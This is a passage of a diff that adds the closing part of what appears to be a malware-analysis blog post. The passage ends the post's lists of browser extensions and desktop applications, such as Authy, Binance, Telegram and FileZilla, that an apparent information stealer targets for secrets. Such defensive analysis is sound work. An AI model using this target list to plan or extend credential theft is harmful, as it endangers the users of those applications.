+<li>NextCloud Edge</li>
+<li>Steganos</li>
+<li>Steganos Edge</li>
+<li>Netwrix Password</li>
+<li>Netwrix Password Edge</li>
+<li>pCloud</li>
+<li>pCloud Edge</li>
+<li>Sticky Edge</li>
+<li>Kaspersky Edge</li>
+<li>authenticator.cc</li>
+<li>authenticator.cc Edge</li>
+</ul>
+<h3 id="targeted-applications">Targeted applications</h3>
+<ul>
+<li>Binance</li>
+<li>Authy</li>
+<li>WinAuth</li>
+<li>Skype</li>
+<li>Sticky Notes</li>
+<li>Telegram</li>
+<li>OpenVPN</li>
+<li>WinSCP</li>
+<li>Steam</li>
+<li>FileZilla</li>
+<li>Discord</li>
+</ul>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/malware-analysis">malware analysis</a></li>
+					
+					<li><a href="/tags/reverse-engineering">reverse engineering</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		<div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        var disqus_shortname = 'pygrum-security';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
+        Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a></article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/pygrum" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/pygrumsec" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © Pygrum  
+</footer>
+
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
